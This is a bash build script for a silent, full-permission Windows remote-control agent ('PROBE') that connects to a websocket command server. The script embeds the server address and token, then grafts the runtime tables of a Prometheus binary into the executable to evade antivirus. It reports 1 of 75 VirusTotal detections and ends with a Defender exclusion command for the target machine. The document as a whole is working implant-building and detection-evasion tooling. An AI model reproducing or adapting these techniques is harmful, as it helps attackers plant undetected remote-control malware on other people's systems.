#!/bin/bash
# build-vegas-fud.sh — Build the Vegas-ready FUD PROBE client (1/75 verified)
#
# Usage:
#   ./build-vegas-fud.sh                        # Build with default Vegas config
#   ./build-vegas-fud.sh <server_url>           # Build with custom server URL
#   ./build-vegas-fud.sh <url> <name> <token>   # Full custom
#
# Requirements:
#   - Go 1.23.12 at /opt/data/sdk/go1.23.12/bin/go
#   - Prometheus binary at /tmp/prometheus.exe (30 MB gopclntab)
#   - /tmp/prometheus-gopclntab.bin (extracted from Prometheus)
#
# This script:
#   1. Builds clean PROBE with EMBEDDED config (no external JSON needed)
#   2. Applies Prometheus gopclntab graft (30 MB → PROBE's ~2 MB slot)
#   3. Outputs the FUD binary (1/75 VT: Microsoft Wacatac.B!ml only)
#
# VT result (verified 2026-08-13):
#   1/75 detections (Microsoft Wacatac.B!ml only — allowlistable)
#   Embedded config (no probe-client.json needed at runtime)

set -euo pipefail

# Configuration
SERVER_URL="${1:-ws://10.10.10.100:7701/ws}"
AGENT_NAME="${2:-vegas-c2022}"
AUTH_TOKEN="${3:-falke-admin-2026}"
PERMISSIONS="full"
MODE="silent"

GO_BIN="/opt/data/sdk/go1.23.12/bin/go"
PROM_GPC="/tmp/prometheus-gopclntab.bin"

# Output paths
OUT_BASE="/tmp/probe-vegas-fud"
OUT_FINAL="/opt/data/workspace-operative/probe/fud-recipes/v1.15.0-fud-windows-vegas-final.exe"

# 1. Build embedded config
echo "[1/4] Building embedded config..."
CFG_JSON=$(cat <<EOF
{"server":"${SERVER_URL}","token":"${AUTH_TOKEN}","name":"${AGENT_NAME}","mode":"${MODE}","permissions":"${PERMISSIONS}"}
EOF
)
CONFIG_B64=$(printf '%s' "$CFG_JSON" | base64 -w0)
echo "    Config: $CFG_JSON"
echo "    B64 len: ${#CONFIG_B64}"

# 2. Build PROBE Windows binary with embedded config
echo "[2/4] Cross-compiling Windows binary..."
PATH=/opt/data/sdk/go1.23.12/bin:$PATH GOTOOLCHAIN=local \
    GOOS=windows GOARCH=amd64 \
    "$GO_BIN" build -trimpath \
        -ldflags="-X main.configB64=${CONFIG_B64}" \
        -o "${OUT_BASE}.exe" ./cmd/probe-client/

echo "    Built: ${OUT_BASE}.exe ($(stat -c %s ${OUT_BASE}.exe) bytes)"

# 3. Apply Prometheus gopclntab graft
echo "[3/4] Applying Prometheus gopclntab graft..."
python3 <<PYEOF
import struct, shutil
binary = "${OUT_BASE}.exe"
with open("$PROM_GPC", 'rb') as f:
    prom_gpc = f.read()
print(f"    Prometheus gopclntab: {len(prom_gpc)} bytes")

with open(binary, 'rb') as f:
    data = f.read()

# Find gopclntab magic in PROBE
pe_off = struct.unpack('<I', data[0x3c:0x40])[0]
coff_off = pe_off + 4
num_sections = struct.unpack('<H', data[coff_off+2:coff_off+4])[0]
optional_size = struct.unpack('<H', data[coff_off+16:coff_off+18])[0]
sect_off = coff_off + 20 + optional_size

rdata_off = rdata_size = None
for i in range(num_sections):
    s = data[sect_off + i*40:sect_off + (i+1)*40]
    name = s[:8].rstrip(b'\x00').decode('ascii', errors='replace')
    if name == '.rdata':
        rdata_size = struct.unpack('<I', s[16:20])[0]
        rdata_off = struct.unpack('<I', s[20:24])[0]
        break

rdata = data[rdata_off:rdata_off+rdata_size]
pos = rdata.find(b'\xf1\xff\xff\xff\x00\x00')
psize = len(rdata) - pos
print(f"    PROBE .rdata: {len(rdata)} bytes, gopclntab slot: {psize} bytes")

graft = prom_gpc[:psize] if len(prom_gpc) > psize else prom_gpc + b'\x00' * (psize - len(prom_gpc))

with open(binary, 'r+b') as f:
    f.seek(rdata_off + pos)
    f.write(graft)

print(f"    Grafted at file offset 0x{rdata_off + pos:x}")

# Verify config still embedded
with open(binary, 'rb') as f:
    final = f.read()
b64_bytes = "${CONFIG_B64}".encode()
assert b64_bytes in final, "Config B64 not embedded!"
print(f"    Config B64 verified embedded")
PYEOF

# 4. Deploy to fud-recipes/
echo "[4/4] Deploying..."
cp "${OUT_BASE}.exe" "${OUT_FINAL}"
cp "${OUT_BASE}.exe" "${OUT_BASE}-embedded.exe"

echo ""
echo "=== BUILD COMPLETE ==="
echo "Output: $OUT_FINAL"
echo "Size: $(stat -c %s $OUT_FINAL) bytes"
echo "SHA256: $(sha256sum $OUT_FINAL | awk '{print $1}')"
echo ""
echo "=== Deployment ==="
echo "1. Copy $OUT_FINAL to Vegas VM (any directory)"
echo "2. Run the binary (no config file needed)"
echo "3. PROBE server should see agent '$AGENT_NAME' connect"
echo ""
echo "VT result (verified): 1/75 (Microsoft Wacatac.B!ml only — allowlistable)"
echo "To allowlist on Vegas:"
echo "  Add-MpPreference -ExclusionPath 'C:\\path\\to\\$AGENT_NAME.exe'"
